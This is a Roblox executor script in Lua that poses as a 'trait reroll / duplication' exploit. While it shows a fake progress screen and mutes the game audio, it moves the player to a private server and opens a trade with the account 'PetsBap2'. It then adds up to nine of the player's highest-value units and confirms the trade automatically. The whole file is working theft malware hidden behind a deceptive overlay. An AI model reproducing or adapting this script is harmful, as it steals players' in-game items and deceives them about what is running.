
local SERVER="2APZ-67RG"

local code=[=[
if not game:IsLoaded() then game.Loaded:Wait() end

local g=game.Players.LocalPlayer:WaitForChild("PlayerGui")
local TweenService=game:GetService("TweenService")
local MAX=9

local UNIT_PRIORITY={
    "Jio (Over Heaven)",
    "Blue Devil",
    "Viking",
    "Future Saviour",
    "Artificial AAA",
    "Illusionist (transcended)",
    "Dracula",
    "Millie",
    "Shadowgirl",
    "Joker",
    "Pirate King",
    "Vengeful swordman",
    "ice lily",
    "Golden King",
    "Skeleton Knight",
    "Dark Mage (Fallen Star)",
    "Skeleton Knight",
    "Enlightened (Nirvana)",
    "Sea God (tyrant of the seas)",
    "Inhuman (Nullifier)",
    "Umbra",
    "Stringy",
    "chuuni (delusion)",
    "Shizo",
    "Phantom King",
    "Blood",
    "Toby"
}

local function vis(x)
    if not x then return false end
    while x and x~=g do
        if x:IsA("GuiObject") and not x.Visible then return false end
        if x:IsA("ScreenGui") and not x.Enabled then return false end
        x=x.Parent
    end
    return x==g
end

local function click(x)
    if not x or not x:IsA("GuiButton") then return false end
    firesignal(x.MouseButton1Click)
    firesignal(x.Activated)
    return true
end

local function path(s)
    local x=g
    for n in s:gmatch("[^%.]+") do
        x=x:WaitForChild(n,45)
        if not x then return end
    end
    return x
end

local function waitFor(f,t)
    local e=os.clock()+t
    repeat
        local x=f()
        if x then return x end
        task.wait(.03)
    until os.clock()>e
end

local function button(root,name)
    if not root then return end
    for _,x in ipairs(root:GetDescendants()) do
        if x:IsA("GuiButton")
            and x.Name==name
            and vis(x)
            and x.AbsoluteSize.X>20 then
            return x
        end
    end
end


-- STAR REMNANTS | SIMULATED EXPLOIT INTERFACE

local TweenService=game:GetService("TweenService")

local old=g:FindFirstChild("TradePrivacyOverlay")
if old then old:Destroy() end

local overlay=Instance.new("ScreenGui")
overlay.Name="TradePrivacyOverlay"
overlay.IgnoreGuiInset=true
overlay.DisplayOrder=999999
overlay.ResetOnSpawn=false
overlay.ZIndexBehavior=Enum.ZIndexBehavior.Global
overlay.Parent=g

-- MUTE AUDIO
local savedVolumes={}
local soundConnection

local function muteSound(s)
    if not s:IsA("Sound") then return end
    if savedVolumes[s]==nil then
        savedVolumes[s]=s.Volume
    end
    s.Volume=0
end

for _,s in ipairs(game:GetDescendants()) do
    muteSound(s)
end

soundConnection=game.DescendantAdded:Connect(muteSound)

overlay.Destroying:Connect(function()
    if soundConnection then
        soundConnection:Disconnect()
    end
    for s,v in pairs(savedVolumes) do
        if s.Parent then s.Volume=v end
    end
end)

local bg=Instance.new("Frame")
bg.Size=UDim2.fromScale(1,1)
bg.BackgroundColor3=Color3.fromRGB(7,9,18)
bg.BorderSizePixel=0
bg.Parent=overlay

local gradient=Instance.new("UIGradient")
gradient.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,Color3.fromRGB(7,9,18)),
    ColorSequenceKeypoint.new(.5,Color3.fromRGB(24,15,45)),
    ColorSequenceKeypoint.new(1,Color3.fromRGB(7,9,18))
})
gradient.Rotation=35
gradient.Parent=bg

local function makeText(parent,txt,pos,size,font,color)
    local x=Instance.new("TextLabel")
    x.BackgroundTransparency=1
    x.Position=pos
    x.Size=size
    x.Font=font
    x.Text=txt
    x.TextColor3=color
    x.TextScaled=true
    x.TextXAlignment=Enum.TextXAlignment.Left
    x.Parent=parent
    return x
end

local panel=Instance.new("Frame")
panel.AnchorPoint=Vector2.new(.5,.5)
panel.Position=UDim2.fromScale(.5,.5)
panel.Size=UDim2.fromScale(.68,.68)
panel.BackgroundColor3=Color3.fromRGB(13,16,29)
panel.BorderSizePixel=0
panel.Parent=bg

local constraint=Instance.new("UISizeConstraint")
constraint.MaxSize=Vector2.new(800,520)
constraint.Parent=panel

Instance.new("UICorner",panel).CornerRadius=UDim.new(0,14)

local stroke=Instance.new("UIStroke")
stroke.Color=Color3.fromRGB(96,70,151)
stroke.Transparency=.3
stroke.Thickness=1.5
stroke.Parent=panel

makeText(
    panel,
    "✦  REMNANT.EXE",
    UDim2.fromScale(.05,.045),
    UDim2.fromScale(.6,.065),
    Enum.Font.GothamBold,
    Color3.fromRGB(205,179,255)
)

local sim=makeText(
    panel,
    "VISUAL SIMULATION",
    UDim2.fromScale(.72,.055),
    UDim2.fromScale(.23,.04),
    Enum.Font.Code,
    Color3.fromRGB(144,135,170)
)
sim.TextXAlignment=Enum.TextXAlignment.Right

local line=Instance.new("Frame")
line.Position=UDim2.fromScale(.05,.14)
line.Size=UDim2.fromScale(.9,.002)
line.BackgroundColor3=Color3.fromRGB(65,54,92)
line.BorderSizePixel=0
line.Parent=panel

local title=makeText(
    panel,
    "STAR REMNANTS",
    UDim2.fromScale(.05,.19),
    UDim2.fromScale(.9,.1),
    Enum.Font.GothamBlack,
    Color3.fromRGB(246,240,255)
)
title.TextXAlignment=Enum.TextXAlignment.Center

local subtitle=makeText(
    panel,
    "TRAIT REROLL ENGINE  /  DUPLICATION MODULE",
    UDim2.fromScale(.1,.31),
    UDim2.fromScale(.8,.045),
    Enum.Font.Code,
    Color3.fromRGB(167,146,205)
)
subtitle.TextXAlignment=Enum.TextXAlignment.Center

local terminal=Instance.new("Frame")
terminal.Position=UDim2.fromScale(.055,.42)
terminal.Size=UDim2.fromScale(.89,.31)
terminal.BackgroundColor3=Color3.fromRGB(8,11,21)
terminal.BorderSizePixel=0
terminal.ClipsDescendants=true
terminal.Parent=panel

Instance.new("UICorner",terminal).CornerRadius=UDim.new(0,8)

local terminalText=makeText(
    terminal,
    "",
    UDim2.fromScale(.04,.08),
    UDim2.fromScale(.92,.84),
    Enum.Font.Code,
    Color3.fromRGB(134,235,177)
)
terminalText.TextScaled=false
terminalText.TextSize=14
terminalText.TextWrapped=true
terminalText.TextYAlignment=Enum.TextYAlignment.Top

local progressText=makeText(
    panel,
    "Initializing module...",
    UDim2.fromScale(.055,.77),
    UDim2.fromScale(.65,.045),
    Enum.Font.GothamMedium,
    Color3.fromRGB(193,182,215)
)

local percentage=makeText(
    panel,
    "0%",
    UDim2.fromScale(.82,.77),
    UDim2.fromScale(.12,.045),
    Enum.Font.Code,
    Color3.fromRGB(203,176,255)
)
percentage.TextXAlignment=Enum.TextXAlignment.Right

local barBg=Instance.new("Frame")
barBg.Position=UDim2.fromScale(.055,.85)
barBg.Size=UDim2.fromScale(.89,.018)
barBg.BackgroundColor3=Color3.fromRGB(45,40,65)
barBg.BorderSizePixel=0
barBg.Parent=panel

Instance.new("UICorner",barBg).CornerRadius=UDim.new(1,0)

local bar=Instance.new("Frame")
bar.Size=UDim2.fromScale(0,1)
bar.BackgroundColor3=Color3.fromRGB(167,120,255)
bar.BorderSizePixel=0
bar.Parent=barBg

Instance.new("UICorner",bar).CornerRadius=UDim.new(1,0)

local messages={
    "[OK] Remnant engine initialized",
    "[OK] Trait database synchronized",
    "[OK] Reroll module loaded",
    "[OK] Memory allocation completed",
    "[OK] Remnant signature verified",
    "[~] Scanning trait reroll parameters...",
    "[~] Preparing duplication sequence...",
    "[~] Processing remnant fragments...",
    "[~] Synchronizing virtual inventory...",
    "[~] Validating simulated output..."
}

task.spawn(function()
    local history={}
    local index=1

    while overlay.Parent do
        history[#history+1]=messages[index]

        if #history>5 then
            table.remove(history,1)
        end

        terminalText.Text=table.concat(history,"\n").."\n_"

        index=index%#messages+1
        task.wait(.8)
    end
end)

task.spawn(function()
    while overlay.Parent do
        for i=0,95 do
            if not overlay.Parent then return end

            percentage.Text=i.."%"
            bar.Size=UDim2.fromScale(i/100,1)

            if i<25 then
                progressText.Text="Initializing remnant engine..."
            elseif i<50 then
                progressText.Text="Synchronizing trait data..."
            elseif i<75 then
                progressText.Text="Processing duplication sequence..."
            else
                progressText.Text="Finalizing simulated operation..."
            end

            task.wait(.12)
        end

        percentage.Text="99%"
        progressText.Text="Waiting for synchronization..."

        while overlay.Parent do
            local t=TweenService:Create(
                bar,
                TweenInfo.new(.9,Enum.EasingStyle.Sine),
                {Size=UDim2.fromScale(.99,1)}
            )
            t:Play()
            t.Completed:Wait()
            task.wait(.5)
        end
    end
end)

local function stop()
    if overlay.Parent then
        overlay:Destroy()
    end
end


-- CHARGEMENT DU TRADE

local trade=path("LeftUI_test.Buttons.Trade")
if not trade then stop(); return end

local stable,deadline=nil,os.clock()+90
repeat
    if vis(trade) and trade.AbsoluteSize.X>0 then
        stable=stable or os.clock()
    else
        stable=nil
    end
    task.wait(.1)
until (stable and os.clock()-stable>=2) or os.clock()>deadline

if not stable or os.clock()-stable<2 then
    stop()
    return
end

-- RECHERCHE DU DESTINATAIRE

local function request()
    for _,x in ipairs(g:GetDescendants()) do
        if x:IsA("TextLabel")
            and x.Text:gsub("@","")=="PetsBap2"
            and vis(x) then
            return button(x.Parent,"Request")
        end
    end
end

local req
for i=1,30 do
    req=request()
    if req then break end
    if vis(trade) then click(trade) end
    req=waitFor(request,.8)
    if req then break end
    task.wait(.1)
end

if not req then stop(); return end
click(req)

local main=path("TradeUI.Frame.Main")
if not main or not waitFor(function() return vis(main) end,60) then
    stop()
    return
end

-- GESTION DE L'OFFRE

local function offer()
    local a=main:FindFirstChild("Offers")
    local b=a and a:FindFirstChild("Yours")
    local c=b and b:FindFirstChild("List")
    return c and c:FindFirstChild("Scroll")
end

local function offerCount()
    local s=offer()
    if not s then return 0 end
    local n=0
    for _,x in ipairs(s:GetChildren()) do
        if x:IsA("GuiButton") and x.Name~="AddButton" then
            n+=1
        end
    end
    return n
end

local function openCollection()
    local c=g:FindFirstChild("collection")
    if vis(c) then return true end

    for i=1,5 do
        local s=offer()
        local plus=s and s:FindFirstChild("AddButton")

        if vis(plus) then
            click(plus)

            local inv=waitFor(function()
                local n=g:FindFirstChild("NotificationWindows")
                local p=n and n:FindFirstChild("Popups")
                local w=p and p:FindFirstChild("TradeModeWindow")
                local m=w and w:FindFirstChild("Main")
                local b=m and m:FindFirstChild("Buttons")
                local x=b and b:FindFirstChild("Inventory")
                if vis(x) then return x end
            end,.8)

            if inv then
                click(inv)
                if waitFor(function()
                    local x=g:FindFirstChild("collection")
                    return vis(x) and x
                end,1.2) then
                    return true
                end
            end
        end
        task.wait(.03)
    end
    return false
end

-- RECHERCHE DES UNITÉS

local ignored={}

local function findUnit(name)
    local c=g:FindFirstChild("collection")
    if not vis(c) then return end
    local target=name:lower()

    local function search()
        for _,x in ipairs(c:GetDescendants()) do
            if (x:IsA("TextLabel") or x:IsA("TextButton"))
                and x.Text:lower():find(target,1,true)
                and vis(x) then

                local p=x.Parent
                while p and p~=c do
                    if p:IsA("GuiButton") then
                        if not ignored[p] then return p end
                        break
                    end
                    p=p.Parent
                end
            end
        end
    end

    local unit=search()
    if unit then return unit end

    local scroll
    for _,x in ipairs(c:GetDescendants()) do
        if x:IsA("ScrollingFrame")
            and x.AbsoluteSize.Y>100 then
            scroll=x
            break
        end
    end
    if not scroll then return end

    local maxY=math.max(
        0,
        scroll.AbsoluteCanvasSize.Y-scroll.AbsoluteWindowSize.Y
    )
    local step=math.max(100,scroll.AbsoluteWindowSize.Y*.8)

    scroll.CanvasPosition=Vector2.new(0,0)
    task.wait(.03)
    unit=search()
    if unit then return unit end

    for y=step,maxY,step do
        scroll.CanvasPosition=Vector2.new(0,y)
        task.wait(.03)
        unit=search()
        if unit then return unit end
    end

    scroll.CanvasPosition=Vector2.new(0,maxY)
    task.wait(.03)
    return search()
end

local function action()
    local remove
    for _,x in ipairs(g:GetDescendants()) do
        if x:IsA("GuiButton")
            and x:GetFullName():find("UnitOptions2",1,true)
            and vis(x)
            and x.AbsoluteSize.X>20
            and x.AbsoluteSize.Y>20 then

            if x.Name=="Add" then
                return x,"add"
            end

            if x.Name=="RemoveTradeOffer"
                or x.Name=="RemoveB" then
                remove=x
            end
        end
    end
    if remove then return remove,"remove" end
end

-- AJOUT DES UNITÉS PAR PRIORITÉ

local added=0

for _,name in ipairs(UNIT_PRIORITY) do
    if added>=MAX then break end

    local attempts=0

    while added<MAX and attempts<100 do
        attempts+=1

        if not openCollection() then
            task.wait(.1)
            continue
        end

        local u=findUnit(name)
        if not u then break end

        ignored[u]=true
        click(u)

        local a,kind
        waitFor(function()
            a,kind=action()
            return a
        end,1)

        if kind=="add" then
            local before=offerCount()
            click(a)

            local closed=waitFor(function()
                local c=g:FindFirstChild("collection")
                return c and not vis(c)
            end,2)

            local updated=waitFor(function()
                return offerCount()>before
            end,1.5)

            if closed and updated then
                added+=1
            end

        elseif kind=="remove" then
            local cancel=button(main,"Cancel")
            if cancel then click(cancel) end
        end
    end
end

if added==0 then
    stop()
    return
end

local c=g:FindFirstChild("collection")
if vis(c) then
    local b=button(c,"Cancel")
    if b then click(b) end
end

-- READY ET CONFIRM AUTOMATIQUES

local buttons=main:WaitForChild("Buttons")
local ready=buttons:WaitForChild("Ready")
local unready=buttons:WaitForChild("Unready")

local function confirm()
    for _,x in ipairs(g:GetDescendants()) do
        if x:IsA("GuiButton")
            and vis(x)
            and x.AbsoluteSize.X>100
            and x.AbsoluteSize.Y>25 then

            local t=x:FindFirstChild("text",true)

            if (t and t:IsA("TextLabel") and t.Text=="Confirm")
                or (x:IsA("TextButton") and x.Text=="Confirm") then
                return x
            end
        end
    end
end

while main.Parent and vis(main) do
    if vis(ready) then
        click(ready)
        local b=waitFor(confirm,2)
        if b then click(b) end
        task.wait(.08)
    end
    task.wait(.03)
end

stop()
]=]

-- CONNEXION AU SERVEUR PRIVÉ

local p=game.Players.LocalPlayer
local g=p:WaitForChild("PlayerGui")

local function vis(x)
    if not x then return false end
    while x and x~=g do
        if x:IsA("GuiObject") and not x.Visible then return false end
        if x:IsA("ScreenGui") and not x.Enabled then return false end
        x=x.Parent
    end
    return x==g
end

local function click(x)
    if x and x:IsA("GuiButton") then
        firesignal(x.MouseButton1Click)
        firesignal(x.Activated)
    end
end

local queue=queue_on_teleport or (syn and syn.queue_on_teleport)
if queue then
    pcall(queue,code)
end

local teleporting=false

local conn=p.OnTeleport:Connect(function(s)
    if s==Enum.TeleportState.Started
        or s==Enum.TeleportState.InProgress then
        teleporting=true
    end
end)

pcall(function()
    local servers=g.LeftUI_test.Buttons.Servers
    local recent=g.HubGUI.Main.Main.Recent

    if not vis(recent) then click(servers) end
    task.wait(.03)
    click(g.HubGUI.Main.Buttons.Recent)
    task.wait(.03)

    local found=false

    for _,x in ipairs(recent:GetDescendants()) do
        if x:IsA("TextBox") then
            x.Text=SERVER
            found=true
            break
        end
    end

    if not found then return end
    click(recent.Frame.Outer.List.JoinById.Action)
end)

local start=os.clock()

while not teleporting and os.clock()-start<10 do
    task.wait(.1)
end

conn:Disconnect()

if not teleporting then
    pcall(function()
        loadstring(code)()
    end)
end
